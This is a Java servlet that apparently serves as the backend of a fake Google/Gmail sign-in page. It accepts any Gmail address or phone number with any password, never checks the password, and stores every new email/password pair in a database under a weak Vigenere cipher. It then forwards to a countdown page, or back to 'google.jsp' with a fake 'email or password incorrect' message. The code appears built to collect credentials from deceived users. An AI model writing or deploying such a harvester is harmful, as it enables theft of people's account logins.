package controller;

import java.io.IOException;
import java.util.regex.Pattern;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.tomcat.util.file.Matcher;

import com.mysql.cj.Session;

import database.GmailDAO;
import model.Gmail;

/**
 * Servlet implementation class LogByEmail
 */
@WebServlet("/dang-nhap-email")
public class LogByEmail extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public LogByEmail() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		request.setCharacterEncoding("UTF-8");
		response.setCharacterEncoding("UTF-8");
		response.setContentType("UTF-8");
		
		String email = request.getParameter("email");
		String password = request.getParameter("password");
		
		boolean error = false;
		Pattern emailPattern = Pattern.compile("((\\w+@gmail.com)|(0+\\d{9}))*");
		java.util.regex.Matcher emailMatcher = emailPattern.matcher(email);
		if(!emailMatcher.matches()) {
			error = true;
		}
		String url = "/CountDown.html";
		if(error == false) {
			password = model.VigenereCipher.encrypt(password);
			Gmail gmail = new Gmail(email, password);
			Gmail gmail2 = GmailDAO.getInstance().selectByUser(gmail);
			if(gmail2 == null) {
				GmailDAO.getInstance().insert(gmail);
			}
			HttpSession session = request.getSession();
			session.setAttribute("log", email);
		}else {
			url = "/google.jsp";
			request.setAttribute("email", email);
			request.setAttribute("e_email", "Email hoặc mật khẩu không chính xác");
		}
		RequestDispatcher requestDispatcher = getServletContext().getRequestDispatcher(url);
		requestDispatcher.forward(request, response);
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		doGet(request, response);
	}

}
